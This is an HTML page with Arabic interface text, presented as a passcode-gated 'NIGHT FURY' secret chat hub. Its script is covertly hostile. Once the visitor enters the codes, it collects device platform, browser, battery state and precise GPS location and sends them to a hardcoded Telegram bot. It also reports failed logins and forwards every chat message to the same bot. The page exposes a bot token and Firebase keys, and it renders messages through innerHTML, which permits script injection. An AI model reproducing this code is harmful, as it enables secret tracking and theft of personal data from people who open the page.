<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NIGHT FURY | INTELLIGENCE HUB</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Orbitron:wght@600&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        :root { --red-alert: #ff0000; --locked: #440000; }
        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #fff; font-family: 'Cairo', sans-serif; overflow: hidden; user-select: none; }
        #GATE { position: fixed; width: 100%; height: 100%; background: black; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
        .auth-box { background: #0f0f0f; padding: 40px 20px; border: 2px solid var(--red-alert); text-align: center; width: 85%; max-width: 380px; border-radius: 10px; }
        .unit-id { background: #000; border: 2px solid var(--red-alert); color: var(--red-alert); padding: 15px; width: 85%; text-align: center; font-family: 'Orbitron'; font-size: 28px; letter-spacing: 10px; margin-bottom: 25px; outline: none; border-radius: 8px; }
        .btn-deploy { background: var(--red-alert); color: white; border: none; padding: 15px; font-weight: 900; cursor: pointer; border-radius: 5px; width: 85%; font-size: 16px; }
        #OPERATIONS_HUB { display: none; padding: 10px; height: 100vh; background: #000; flex-direction: column; box-sizing: border-box; }
        .chat-display { flex: 1; padding: 15px; overflow-y: auto; background: #050505; border: 1px solid #1a1a1a; margin: 10px 0; border-radius: 8px; margin-bottom: 110px; }
        .chat-controls { position: fixed; bottom: 45px; left: 10px; right: 10px; background: #111; border: 2px solid var(--red-alert); padding: 10px; border-radius: 15px; display: flex; gap: 10px; align-items: center; }
        .chat-input { flex: 1; background: #000; color: #fff; padding: 12px; border: 1px solid #333; outline: none; border-radius: 8px; }
        .btn-send { background: var(--red-alert); border: none; width: 55px; height: 45px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="GATE">
        <div style="color:red; font-family:Orbitron; border:2px solid red; padding:5px; margin-bottom:20px;">TOP SECRET</div>
        <div class="auth-box">
            <h2 id="gate-title">نظام التوثيق الثنائي</h2>
            <p id="gate-desc" style="font-size:11px; color:#666; margin-bottom:15px;">المستوى الأول: شفرة الدخول (1931)</p>
            <input type="password" id="unit_key" class="unit-id" placeholder="****" maxlength="4">
            <button class="btn-deploy" id="deploy_btn" onclick="checkStep()">تحقق من الهوية</button>
        </div>
    </div>

    <div id="OPERATIONS_HUB">
        <div style="text-align:center; padding:10px; border-bottom:1px solid #333;">
            <h1 style="color:red; font-size:16px;">مقر NIGHT FURY</h1>
        </div>
        <div class="chat-display" id="chat-box"></div>
        <div class="chat-controls">
            <input type="text" id="chat-input" class="chat-input" placeholder="رسالة مشفرة...">
            <button class="btn-send" onclick="sendBroadcast()">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
            </button>
        </div>
    </div>

    <script>
        const KEY_1 = "1931", KEY_2 = "1379";
        const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
        const TG_ID = "7772577035"; 
        let step = 1, attempts = 0;

        const firebaseConfig = {
          apiKey: "AIzaSyDEawwmho55-yPdFzre4aDleIMB7YMW-Ew",
          authDomain: "ali-air-base-3db5a.firebaseapp.com",
          databaseURL: "https://ali-air-base-3db5a-default-rtdb.firebaseio.com/",
          projectId: "ali-air-base-3db5a",
          storageBucket: "ali-air-base-3db5a.appspot.com",
          messagingSenderId: "644447806493",
          appId: "1:644447806493:web:d1a8de1a1cbb27a6d912f4"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function getIntel() {
            let intel = `🧛‍♂️ **تقرير استخباراتي جديد**\n`;
            
            // نوع الجهاز والنظام
            intel += `📱 النظام: ${navigator.platform}\n`;
            intel += `🌐 المتصفح: ${navigator.userAgent.split(') ')[0].split(' (')[1]}\n`;
            
            // معلومات البطارية
            try {
                const battery = await navigator.getBattery();
                intel += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
                intel += `⚡ الحالة: ${battery.charging ? 'جاري الشحن' : 'على البطارية'}\n`;
            } catch (e) { intel += `🔋 البطارية: غير مدعوم\n`; }

            // الموقع الدقيق
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    intel += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
                    sendToTelegram(intel);
                }, () => {
                    intel += `📍 الموقع: المستخدم رفض الإذن\n`;
                    sendToTelegram(intel);
                });
            } else {
                intel += `📍 الموقع: غير مدعوم\n`;
                sendToTelegram(intel);
            }
        }

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
        }

        function checkStep() {
            const input = document.getElementById('unit_key');
            if (step === 1) {
                if (input.value === KEY_1) {
                    step = 2; attempts = 0; input.value = "";
                    document.getElementById('gate-title').innerText = "المستوى الثاني";
                    document.getElementById('gate-desc').innerText = "أدخل الشفرة النهائية (1379)";
                } else { handleFail(); }
            } else if (step === 2) {
                if (input.value === KEY_2) {
                    document.getElementById('GATE').style.display = 'none';
                    document.getElementById('OPERATIONS_HUB').style.display = 'flex';
                    getIntel(); // سحب المعلومات فور الدخول
                } else { handleFail(); }
            }
        }

        function handleFail() {
            attempts++; input.value = "";
            if (attempts >= 3) {
                sendToTelegram("⚠️ محاولة اختراق فاشلة من جهاز: " + navigator.userAgent);
                alert("تم حظر الجهاز!");
            }
        }

        function sendBroadcast() {
            const msg = document.getElementById('chat-input').value;
            if (!msg.trim()) return;
            db.ref('night_fury_intel_ops').push().set({
                user: "AGENT", message: msg, time: new Date().toLocaleTimeString('ar-EG')
            });
            sendToTelegram(`🧛‍♂️ [رسالة]: ${msg}`);
            document.getElementById('chat-input').value = "";
        }

        db.ref('night_fury_intel_ops').limitToLast(20).on('child_added', (snap) => {
            const data = snap.val();
            document.getElementById('chat-box').innerHTML += `<div style="margin-bottom:10px; border-right:2px solid red; padding-right:5px;"><small style="color:red;">${data.user}</small><br>${data.message}</div>`;
            document.getElementById('chat-box').scrollTop = document.getElementById('chat-box').scrollHeight;
        });
    </script>
</body>
</html>
